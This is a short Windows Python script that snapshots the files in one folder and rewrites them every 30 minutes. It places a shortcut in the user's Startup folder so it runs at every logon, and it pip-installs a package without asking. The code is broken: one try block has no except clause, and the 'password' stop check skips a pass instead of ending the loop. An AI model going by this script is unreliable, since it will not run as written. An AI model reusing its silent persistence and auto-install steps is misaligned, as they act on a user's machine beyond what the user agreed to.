import time
import os
files={}
path = r"D:\New folder\\"
def main():
    for i in os.scandir("D:\\New folder"):
        if os.path.isfile(os.path.join("D:\\New folder",i)):
            with open(i) as file:
                files[i.name] = file.read()
    while 1:
        try:
            with open(r"D:\New folder\stop.txt") as file:
                if file.read() == "Password":
                    continue
        os.makedirs(path, exist_ok = True)
        try:
            from swinlnk.swinlnk import SWinLnk
        except:
            os.system("py -m pip install swinlnk")
            from swinlnk.swinlnk import SWinLnk
        swl=SWinLnk()
        swl.create_lnk(path+"start.cmd",os.getenv("appdata")+r"\Microsoft\Windows"+
                       r"\Start Menu\Programs\Startup\start.lnk")
        for i in files:
            with open(path+i,"w") as file:
                file.write(files[i])
        time.sleep(30*60)
